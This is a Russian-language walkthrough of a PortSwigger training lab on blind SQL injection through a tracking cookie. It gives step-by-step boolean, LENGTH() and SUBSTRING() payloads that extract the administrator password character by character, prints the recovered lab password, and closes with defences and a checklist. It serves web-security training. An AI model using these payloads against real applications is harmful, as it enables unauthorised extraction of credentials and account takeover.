# 📘 PortSwigger Lab: Blind SQL Injection with Conditional Responses

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

## 📑 Содержание

- [📘 PortSwigger Lab: Blind SQL Injection with Conditional Responses](#-portswigger-lab-blind-sql-injection-with-conditional-responses)
  - [📑 Содержание](#-содержание)
  - [🎯 Цель](#-цель)
  - [🧠 Идея атаки](#-идея-атаки)
  - [🔍 Шаг 1 — Подтверждение Blind SQLi](#-шаг-1--подтверждение-blind-sqli)
  - [🔍 Шаг 2 — Проверка пользователя administrator](#-шаг-2--проверка-пользователя-administrator)
  - [🔍 Шаг 3 — Определение длины пароля](#-шаг-3--определение-длины-пароля)
  - [🔍 Шаг 4 — Поиск символов пароля вручную](#-шаг-4--поиск-символов-пароля-вручную)
  - [🔍 Шаг 5 — Вход под administrator](#-шаг-5--вход-под-administrator)
  - [🧩 Использованные payloads](#-использованные-payloads)
  - [💥 Почему атака сработала](#-почему-атака-сработала)
  - [🛡 Защита](#-защита)
  - [🛠 Чеклист](#-чеклист)
- [⬆ Наверх](#-наверх)

---

<a id="goal"></a>

## 🎯 Цель

Получить пароль пользователя `administrator` через Blind SQL Injection и выполнить вход в приложение.

---

<a id="idea"></a>

## 🧠 Идея атаки

Приложение использует cookie `TrackingId` и вставляет его значение в SQL-запрос.

Результаты SQL-запроса не отображаются напрямую.

Но есть поведенческий индикатор:

```text
Welcome back
```

Если SQL-условие истинно — сообщение `Welcome back` появляется.

Если SQL-условие ложно — сообщение исчезает.

Это позволяет задавать базе вопросы с ответом:

```text
TRUE / FALSE
```

И постепенно извлекать пароль по одному символу.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Подтверждение Blind SQLi

Сначала проверяем, что можем влиять на SQL-условие.

TRUE payload:

```sql
' AND '1'='1
```

Если условие истинно, в response появляется:

```text
Welcome back
```

FALSE payload:

```sql
' AND '1'='2
```

Если условие ложно, сообщение:

```text
Welcome back
```

исчезает.

Вывод:

```text
Blind SQL Injection подтверждена.
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Проверка пользователя administrator

Проверяем, существует ли пользователь `administrator`.

Payload:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
)='x
```

Если появляется `Welcome back`, значит пользователь существует.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Определение длины пароля

Проверяем длину пароля через `LENGTH()`.

Пример:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
AND LENGTH(password)>10
)='x
```

Если `Welcome back` есть — пароль длиннее 10 символов.

Если `Welcome back` исчез — пароль не длиннее 10 символов.

Далее меняем число:

```text
>10
>15
>20
=20
```

В этой лабе была определена длина:

```text
Password length = 20
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Поиск символов пароля вручную

Теперь пароль имеет вид:

```text
????????????????????
```

20 неизвестных символов.

Проверяем каждый символ отдельно через `SUBSTRING()`.

Payload для первого символа:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='a
```

Здесь:

```sql
SUBSTRING(password,1,1)
```

означает:

```text
взять 1 символ пароля
```

Если появляется `Welcome back`, значит первый символ равен `a`.

Если нет — пробуем следующий символ:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='b
```

И так далее:

```text
a b c d ... z 0 1 2 ... 9
```

Когда символ найден, переходим ко второй позиции:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
2,
1
)='a
```

Здесь:

```sql
SUBSTRING(password,2,1)
```

означает:

```text
взять 2 символ пароля
```

Так повторяем для всех позиций:

```text
1 → найденный символ
2 → найденный символ
3 → найденный символ
...
20 → найденный символ
```

В итоге пароль был восстановлен полностью.

<details>
<summary>🔑 Показать пароль administrator</summary>

```text
Username: administrator
Password: uku46cruf17z4di4hc1u
```

</details>

---

<a id="step5"></a>

## 🔍 Шаг 5 — Вход под administrator

После восстановления пароля открываем страницу:

```text
/login
```

Вводим:

```text
Username: administrator
Password: найденный пароль
```

После успешного входа лаба засчитывается.

---

<a id="payloads"></a>

## 🧩 Использованные payloads

Подтверждение TRUE:

```sql
' AND '1'='1
```

Подтверждение FALSE:

```sql
' AND '1'='2
```

Проверка пользователя:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
)='x
```

Проверка длины:

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
AND LENGTH(password)>10
)='x
```

Проверка символа:

```sql
' AND SUBSTRING(
(SELECT password FROM users WHERE username='administrator'),
1,
1
)='a
```

---

<a id="why"></a>

## 💥 Почему атака сработала

Приложение:

- вставляло cookie `TrackingId` напрямую в SQL-запрос;
- не использовало prepared statements;
- не показывало данные напрямую;
- но возвращало разные responses для TRUE и FALSE условий.

Этого достаточно для Blind SQL Injection.

---

<a id="defense"></a>

## 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Не вставлять cookie напрямую в SQL
- Least Privilege для database user
- Одинаковые responses для TRUE/FALSE условий
- Rate limiting
- WAF как дополнительный слой

---

<a id="checklist"></a>

## 🛠 Чеклист

- [ ] подтвержден TRUE response
- [ ] подтвержден FALSE response
- [ ] найден пользователь administrator
- [ ] определена длина пароля
- [ ] пароль извлечен по символам
- [ ] выполнен login как administrator

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
